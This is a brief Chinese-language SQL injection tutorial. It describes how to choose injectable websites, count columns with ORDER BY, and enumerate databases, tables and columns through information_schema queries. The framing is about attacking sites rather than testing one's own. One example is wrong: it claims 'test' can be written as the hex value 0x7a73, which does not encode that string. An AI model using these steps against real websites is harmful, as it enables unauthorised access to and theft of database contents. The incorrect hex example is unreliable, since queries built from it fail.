网站的选择

我们在选择网站一定是要选择可以注入的网站，但是如何区分这个网站是否可以注入我们需要2个条件
1.用户是能够控制输入的内容
2.Web应用把用户输入的内容带入到数据库
在这种情况下，我们才可以确定使用确定SQL是否可以注入

注入点加入成功后，我们需要查看版本信号等等。这时候我们需要使用order by 1,2,3,4,5…进行查看

查看库、表、信息

查询数据库中有那些库
select schema_name from information_schema.SCHEMATA
查询数据库中有那些表
select table_name from information_schema.TABLES
查询数据库中test库中有哪些表
select table_name from information_schema.TABLES where table_schema = ‘test’ // test 可以写成 0x7a73
查询数据库中有那些字段
select column_name from information_schema.COLUMNS
查询数据库中test库中user表有哪些字段
select column_name from information_schema.COLUMNS where table_schema = ‘test’ and table_name = ‘user’
